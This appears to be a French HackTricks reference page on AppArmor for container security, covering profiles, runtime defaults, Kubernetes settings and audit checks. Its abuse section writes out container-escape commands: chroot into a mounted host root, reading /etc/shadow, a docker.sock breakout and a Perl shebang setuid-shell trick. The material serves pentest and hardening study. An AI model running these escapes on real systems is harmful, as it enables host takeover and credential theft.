# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

AppArmor est un système de **Contrôle d'accès obligatoire** qui applique des restrictions via des profils par programme. Contrairement aux vérifications DAC traditionnelles, qui dépendent fortement de la propriété utilisateur et groupe, AppArmor permet au noyau d'appliquer une politique attachée directement au processus. Dans les environnements de conteneurs, cela a de l'importance car une charge de travail peut disposer de privilèges classiques suffisants pour tenter une action et être malgré tout refusée si son profil AppArmor n'autorise pas le chemin, le montage, le comportement réseau ou l'utilisation des capabilities concernés.

Le point conceptuel le plus important est qu'AppArmor est **basé sur les chemins**. Il raisonne sur l'accès au système de fichiers via des règles de chemin plutôt qu'avec des labels comme le fait SELinux. Cela le rend accessible et puissant, mais cela signifie aussi que les bind mounts et les dispositions alternatives de chemins méritent une attention particulière. Si le même contenu de l'hôte devient accessible via un chemin différent, l'effet de la politique peut ne pas correspondre à ce que l'opérateur attendait initialement.

## Rôle dans l'isolation des conteneurs

Les audits de sécurité des conteneurs s'arrêtent souvent aux capabilities et à seccomp, mais AppArmor reste important après ces contrôles. Imaginez un conteneur qui dispose de plus de privilèges que nécessaire, ou une charge de travail qui a besoin d'une capability supplémentaire pour des raisons opérationnelles. AppArmor peut toujours restreindre l'accès aux fichiers, le comportement de montage, le réseau et les schémas d'exécution de manière à bloquer la voie d'abus évidente. C'est pourquoi désactiver AppArmor « juste pour que l'application fonctionne » peut silencieusement transformer une configuration simplement risquée en une configuration activement exploitable.

## Laboratoire

Pour vérifier si AppArmor est actif sur l'hôte, utilisez :
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Pour voir sous quel contexte s'exécute le processus du conteneur en cours :
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La différence est instructive. Dans le cas normal, le processus devrait afficher un contexte AppArmor lié au profil choisi par le runtime. Dans le cas unconfined, cette couche de restriction supplémentaire disparaît.

Vous pouvez aussi inspecter ce que Docker pense avoir appliqué :
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker peut appliquer un profil AppArmor par défaut ou personnalisé lorsque l'hôte le prend en charge. Podman peut aussi s'intégrer à AppArmor sur les systèmes basés sur AppArmor, bien que sur les distributions où SELinux est privilégié, l'autre système MAC prenne souvent le dessus. Kubernetes peut exposer la politique AppArmor au niveau de la charge de travail sur les nœuds qui prennent effectivement en charge AppArmor. LXC et les environnements de conteneurs système de la famille Ubuntu utilisent également AppArmor de manière extensive.

Le point pratique est qu'AppArmor n'est pas une « fonctionnalité Docker ». C'est une fonctionnalité du noyau hôte que plusieurs runtimes peuvent choisir d'appliquer. Si l'hôte ne le prend pas en charge ou si le runtime est configuré pour s'exécuter unconfined, la protection supposée n'existe pas vraiment.

Pour Kubernetes en particulier, l'API moderne est `securityContext.appArmorProfile`. Depuis Kubernetes `v1.30`, les anciennes annotations beta AppArmor sont obsolètes. Sur les hôtes pris en charge, `RuntimeDefault` est le profil par défaut, tandis que `Localhost` désigne un profil qui doit déjà être chargé sur le nœud. Cela a de l'importance lors d'une revue car un manifeste peut sembler compatible AppArmor tout en dépendant entièrement du support côté nœud et des profils préchargés.

Un détail opérationnel subtil mais utile est qu'indiquer explicitement `appArmorProfile.type: RuntimeDefault` est plus strict que d'omettre simplement le champ. Si le champ est défini explicitement et que le nœud ne prend pas en charge AppArmor, l'admission devrait échouer. Si le champ est omis, la charge de travail peut quand même s'exécuter sur un nœud sans AppArmor et ne pas recevoir cette couche de confinement supplémentaire. Du point de vue d'un attaquant, c'est une bonne raison de vérifier à la fois le manifeste et l'état réel du nœud.

Sur les hôtes AppArmor compatibles Docker, le profil par défaut le plus connu est `docker-default`. Ce profil est généré à partir du template AppArmor de Moby et est important car il explique pourquoi certaines PoCs basées sur des capabilities échouent encore dans un container par défaut. Grosso modo, `docker-default` permet le réseau ordinaire, refuse les écritures sur une grande partie de `/proc`, refuse l'accès aux parties sensibles de `/sys`, bloque les opérations de mount, et restreint ptrace de sorte que ce ne soit pas une primitive générale de sondage de l'hôte. Comprendre cette ligne de base aide à distinguer « le container possède `CAP_SYS_ADMIN` » de « le container peut réellement utiliser cette capability contre les interfaces du kernel qui m'intéressent ».

## Profile Management

Les profils AppArmor sont généralement stockés sous `/etc/apparmor.d/`. Une convention de nommage courante consiste à remplacer les slashs du chemin exécutable par des points. Par exemple, un profil pour `/usr/bin/man` est couramment stocké sous `/etc/apparmor.d/usr.bin.man`. Ce détail compte tant en défense qu'en évaluation car une fois que vous connaissez le nom du profil actif, vous pouvez souvent localiser rapidement le fichier correspondant sur l'hôte.

Parmi les commandes utiles de gestion côté hôte :
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La raison pour laquelle ces commandes importent dans une référence sur la sécurité des conteneurs est qu'elles expliquent comment les profils sont réellement construits, chargés, passés en complain mode et modifiés après des changements d'application. Si un opérateur a pour habitude de passer les profils en complain mode lors du dépannage et oublie de rétablir l'enforcement, le conteneur peut sembler protégé dans la documentation alors qu'il se comporte de manière beaucoup plus permissive en réalité.

### Construction et mise à jour des profils

`aa-genprof` peut observer le comportement d'une application et aider à générer un profil de manière interactive :
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` peut générer un modèle de profil qui peut ensuite être chargé avec `apparmor_parser` :
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Lorsque le binaire change et que la politique doit être mise à jour, `aa-logprof` peut rejouer les refus trouvés dans les logs et aider l'opérateur à décider s'il faut les autoriser ou les refuser :
```bash
sudo aa-logprof
```
### Journaux

Les refus AppArmor sont souvent visibles via `auditd`, syslog ou des outils tels que `aa-notify` :
```bash
sudo aa-notify -s 1 -v
```
Ceci est utile sur le plan opérationnel et offensif. Les défenseurs l'utilisent pour affiner les profils. Les attaquants l'utilisent pour savoir quel chemin ou quelle opération exacte est refusée et si AppArmor est le contrôle qui bloque une chaîne d'exploitation.

### Identifier le fichier de profil exact

Quand un runtime affiche un nom de profil AppArmor spécifique pour un container, il est souvent utile de faire correspondre ce nom au fichier de profil sur le disque :
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Cela est particulièrement utile lors d'une revue côté hôte, car cela comble l'écart entre "le conteneur indique qu'il s'exécute sous le profil `lowpriv`" et "les règles réelles se trouvent dans ce fichier spécifique qui peut être audité ou rechargé".

### Règles importantes à auditer

Quand vous pouvez lire un profil, ne vous arrêtez pas aux simples lignes `deny`. Plusieurs types de règles modifient de façon importante l'utilité d'AppArmor contre une tentative d'évasion de conteneur :

- `ux` / `Ux`: exécute le binaire cible sans confinement. Si un helper, shell, ou interpreter accessible est autorisé sous `ux`, c'est généralement la première chose à tester.
- `px` / `Px` and `cx` / `Cx`: effectuent des transitions de profil lors d'un exec. Ce n'est pas automatiquement dangereux, mais cela mérite d'être audité car une transition peut aboutir dans un profil beaucoup plus permissif que le profil actuel.
- `change_profile`: permet à une tâche de passer dans un autre profil chargé, immédiatement ou au prochain exec. Si le profil de destination est plus faible, cela peut devenir l'échappatoire prévue pour sortir d'un domaine restrictif.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: ceux-ci devraient modifier le niveau de confiance que vous accordez au profil. `complain` enregistre les refus au lieu de les appliquer, `unconfined` supprime la frontière, et `prompt` dépend d'un chemin de décision en espace utilisateur plutôt que d'un refus imposé par le noyau.
- `userns` or `userns create,`: les politiques AppArmor récentes peuvent médiatiser la création de user namespaces. Si un profil de conteneur l'autorise explicitement, les user namespaces imbriqués restent en jeu même lorsque la plateforme utilise AppArmor dans le cadre de sa stratégie de durcissement.

Grep utile côté hôte:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ce type d'audit est souvent plus utile que de passer des heures à examiner des centaines de règles de fichiers ordinaires. Si un breakout dépend de l'exécution d'un helper, de l'entrée dans un nouvel espace de noms ou de l'évasion vers un profil moins restrictif, la réponse se cache souvent dans ces règles axées sur les transitions plutôt que dans les lignes évidentes du type `deny /etc/shadow r`.

## Mauvaises configurations

L'erreur la plus évidente est `apparmor=unconfined`. Les administrateurs le définissent souvent lors du débogage d'une application qui a échoué parce que le profil a correctement bloqué quelque chose de dangereux ou inattendu. Si ce flag reste en production, toute la couche MAC est effectivement supprimée.

Un autre problème subtil est de supposer que les bind mounts sont sans danger parce que les permissions des fichiers semblent normales. Comme AppArmor est basé sur les chemins, exposer des chemins de l'hôte sous des points de montage alternatifs peut mal interagir avec les règles de chemin. Une troisième erreur consiste à oublier qu'un nom de profil dans un fichier de configuration signifie très peu si le noyau de l'hôte n'applique pas réellement AppArmor.

## Abus

Quand AppArmor est absent, des opérations auparavant contraintes peuvent soudainement fonctionner : lire des chemins sensibles via des bind mounts, accéder à des parties de procfs ou sysfs qui auraient dû rester plus difficiles d'accès, effectuer des actions liées aux mounts si capabilities/seccomp les permettent également, ou utiliser des chemins qu'un profil refuserait normalement. AppArmor est souvent le mécanisme qui explique pourquoi une tentative de breakout basée sur les capabilities "devrait fonctionner" sur le papier mais échoue encore en pratique. Retirez AppArmor, et la même tentative peut commencer à réussir.

Si vous suspectez qu'AppArmor est le principal frein à une chaîne d'abus par traversée de chemin, bind-mount, ou basée sur des mounts, la première étape consiste généralement à comparer ce qui devient accessible avec et sans profil. Par exemple, si un chemin de l'hôte est monté à l'intérieur du conteneur, commencez par vérifier si vous pouvez le parcourir et le lire :
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si le container dispose également d'une capability dangereuse telle que `CAP_SYS_ADMIN`, l'un des tests les plus pratiques est de vérifier si AppArmor est le contrôle qui bloque les opérations de mount ou l'accès aux kernel filesystems sensibles :
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Dans les environnements où un host path est déjà disponible via un bind mount, la perte d'AppArmor peut également transformer un read-only information-disclosure issue en accès direct aux fichiers de l'hôte :
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Le but de ces commandes n'est pas qu'AppArmor, à lui seul, crée le breakout. Il s'agit plutôt que, une fois AppArmor désactivé, de nombreuses voies d'abus liées au système de fichiers et aux montages deviennent immédiatement testables.

### Exemple complet : AppArmor désactivé + root de l'hôte monté

Si le conteneur a déjà le root de l'hôte monté en bind sur `/host`, la suppression d'AppArmor peut transformer un chemin d'abus du système de fichiers bloqué en un complete host escape :
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Une fois que le shell s'exécute via le système de fichiers de l'hôte, la charge de travail a effectivement franchi la frontière du conteneur :
```bash
id
hostname
cat /etc/shadow | head
```
### Exemple complet : AppArmor désactivé + Runtime Socket

Si la véritable barrière était AppArmor protégeant l'état runtime, un socket monté peut suffire pour une évasion complète :
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Le chemin exact dépend du point de montage, mais le résultat final est le même : AppArmor n'empêche plus l'accès à la runtime API, et la runtime API peut lancer un container compromettant l'hôte.

### Exemple complet: Path-Based Bind-Mount Bypass

Parce qu'AppArmor est basé sur les chemins, protéger `/proc/**` ne protège pas automatiquement le même contenu procfs de l'hôte lorsqu'il est accessible via un chemin différent :
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impact dépend de ce qui est exactement monté et de savoir si le chemin alternatif contourne aussi d'autres contrôles, mais ce schéma est l'une des raisons les plus évidentes pour lesquelles AppArmor doit être évalué conjointement avec l'agencement des points de montage plutôt qu'isolément.

### Exemple complet : Shebang Bypass

La politique AppArmor cible parfois le chemin d'un interpréteur d'une manière qui ne prend pas pleinement en compte l'exécution de scripts via la gestion du shebang. Un exemple historique consistait à utiliser un script dont la première ligne pointe vers un interpréteur confiné :
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ce type d'exemple est important comme rappel que l'intention d'un profil et la sémantique d'exécution réelle peuvent diverger. Lors de l'examen d'AppArmor dans les environnements de conteneurs, les chaînes d'interpréteurs et les chemins d'exécution alternatifs méritent une attention particulière.

## Vérifications

L'objectif de ces vérifications est de répondre rapidement à trois questions : AppArmor est-il activé sur l'hôte, le processus courant est-il confiné, et le runtime a-t-il réellement appliqué un profil à ce conteneur ?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ce qui est intéressant ici :

- Si `/proc/self/attr/current` affiche `unconfined`, la charge de travail ne bénéficie pas du confinement AppArmor.
- Si `aa-status` indique AppArmor désactivé ou non chargé, tout nom de profil dans la configuration du runtime est essentiellement cosmétique.
- Si `docker inspect` affiche `unconfined` ou un profil personnalisé inattendu, c'est souvent la raison pour laquelle un vecteur d'abus basé sur le système de fichiers ou les montages fonctionne.
- Si `/sys/kernel/security/apparmor/profiles` ne contient pas le profil attendu, la configuration du runtime ou de l'orchestrateur ne suffit pas en elle-même.
- Si un profil supposément durci contient des règles de type `ux`, `change_profile` larges, `userns` ou `flags=(complain)`, la frontière pratique peut être bien plus faible que le nom du profil ne le suggère.

Si un conteneur dispose déjà de privilèges élevés pour des raisons opérationnelles, laisser AppArmor activé fait souvent la différence entre une exception contrôlée et une défaillance de sécurité beaucoup plus étendue.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
